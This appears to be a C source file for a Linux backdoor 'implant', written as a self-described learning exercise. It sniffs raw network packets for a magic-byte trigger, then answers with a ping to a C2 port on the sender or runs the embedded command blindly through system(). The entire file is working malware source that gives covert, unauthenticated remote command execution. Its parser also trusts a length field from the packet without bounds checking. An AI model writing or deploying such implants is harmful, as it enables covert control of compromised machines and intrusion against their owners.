/* 
Just some C implant inspired by Khael's PhantomShell https://github.com/KhaelK138/PhantomShell so that I can learn
more about C networking and packets on raw sockets and whatnot
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <sys/socket.h>
#include "packet.h" // Custom packet values defined

// Send a ping
int send_ping(int destination_address) {

    // Set up socket
    struct sockaddr_in addr;
    int socket_fd = socket(AF_INET, SOCK_STREAM, 0);

    addr.sin_family = AF_INET; 
    addr.sin_port = htons(C2_PORT);

    addr.sin_addr.s_addr = destination_address; 

    // Connect to the C2
    if (connect(socket_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("Could not connect to C2");
        return 1;
    }

    // Send pong message
    char *msg = "pong";
    send(socket_fd, msg, strlen(msg), 0);

    close(socket_fd);
    return 0;
}

// Just uses system to execute a command
void execute_command(char* payload) {

    // Use system. Could use execve but system would allow for more shell like command execution
    int ret = system(payload);
}

// Parse payload. Look for our established protocol message
int parse_payload(char* payload, int payload_len, int source_address) {

    struct packet_header incoming; 
    char *command;

    uint32_t magic_net = htonl(MAGIC_BYTES);

    // Find magic bytes in payload
    char *match = memmem(payload, payload_len, &magic_net, sizeof(magic_net)); 

    // If not found skip
    if(match == NULL) {
        return 1;
    }

    // Get magic
    memcpy(&incoming.magic, match, sizeof(uint32_t));
    incoming.magic = ntohl(incoming.magic);

    // Get command type
    memcpy(&incoming.command, match + sizeof(uint32_t), sizeof(uint32_t));
    incoming.command = ntohl(incoming.command);

    // Get cmd length
    memcpy(&incoming.cmd_len, match + 2*sizeof(uint32_t), sizeof(uint32_t));
    incoming.cmd_len = ntohl(incoming.cmd_len);

    // Get actual command
    command = calloc(1, incoming.cmd_len + 1);
    memcpy(command, match + 3*sizeof(uint32_t), incoming.cmd_len);
    command[incoming.cmd_len] = '\0'; // Null terminate

    // Handle command types
    switch (incoming.command) {

        // Handle ping
        case CMD_PING:
            printf("Handling ping\n");
            send_ping(source_address); 
            break;
        
        // Handle command execution (with no output returned)
        case CMD_EXEC_BLIND:
            printf("Handling exec blind\n");
            execute_command(command);
            break;
    }
    

    // Debug printing
    printf("MAGIC FOUND: %x\n", incoming.magic);
    printf("Command Type: %x\n", incoming.command);
    printf("Command Length: %d\n", incoming.cmd_len);
    printf("Actual command: %s\n", command);

    free(command);

    return 0;
}

int main() {

    // PF_PACKET and SOCK_RAW delivers raw ethernet network frames before IP/TCP processing
    // ETH_P_IP filters for only IPv4
    // Some more detail here https://man7.org/linux/man-pages/man7/packet.7.html
    int socket_fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_IP));

    if (socket_fd < 0) {
        perror("Could not create socket");
        return 1; 
    }

    // Can maybe make this dynamic but a command coming in should never be this big lowkey
    char buf[2048]; 

    // Main sniffing loop
    while(1==1) {

        // Layout is here https://man7.org/linux/man-pages/man7/packet.7.html
        struct sockaddr_ll from; 
        socklen_t from_len = sizeof(from); 

        // Incoming packets have layout [Ethernet Header][IP Header][TCP / UDP][Payload] for PF_PACKET and SOCK_RAW
        int received_bytes = recvfrom(socket_fd, buf, sizeof(buf), 0, (struct sockaddr *) &from, &from_len);

        // Skip if packet is not going to this host or if error from recvfrom
        if (from.sll_pkttype != PACKET_HOST || received_bytes < 0) {
            continue;
        }

        // Skip if packet not long enough to have IP header
        if (received_bytes < (int) (sizeof(struct ethhdr) + sizeof(struct iphdr))) {
            continue;
        }

        // IP Header layout is here https://en.wikipedia.org/wiki/IPv4#Header
        // Struct fields are here https://students.mimuw.edu.pl/SO/Linux/Kod/include/linux/ip.h.html
        struct iphdr *ip = (struct iphdr *)(buf  + sizeof(struct ethhdr));
        int ip_header_len = ip->ihl * 4; 

        int source_address = ip->saddr; 

        // Process differently depending on protocol (TCP or UDP)

        char *payload;
        //int port = 0;

        if (ip->protocol == IPPROTO_TCP) {

            // Treat part of buffer that has TCP portion as a struct
            // Layout is here https://sites.uclouvain.be/SystInfo/usr/include/netinet/tcp.h.html
            struct tcphdr *tcp = (struct tcphdr*)(buf + sizeof(struct ethhdr) + ip_header_len);

            // doff is data offset
            int tcp_header_length = tcp->doff * 4;

            // uint16_t dst_port = ntohs(tcp->th_dport);
            // port = dst_port;

            // Now treat TCP portion of buffer as a byte stream and add the offset of the header length to get just the payload
            payload = (char *)tcp + tcp_header_length;
                 
        }

        else if (ip->protocol == IPPROTO_UDP) {

            // Treat part of buffer that has UDP portion as a struct
            // Layout is here https://docs.huihoo.com/doxygen/linux/kernel/3.7/structudphdr.html
            struct udphdr *udp = (struct udphdr*)(buf + sizeof(struct ethhdr) + ip_header_len); 
            
            // Treat UDP portion of buffer as a byte stream and just add the size of the UDP header to get just the payload
            payload = (char *)udp + sizeof(struct udphdr);

        }    

        // (payload - buf) removes the header parts
        int payload_len = received_bytes - (payload - buf);
        int success = parse_payload(payload, payload_len, source_address); 
    }
}
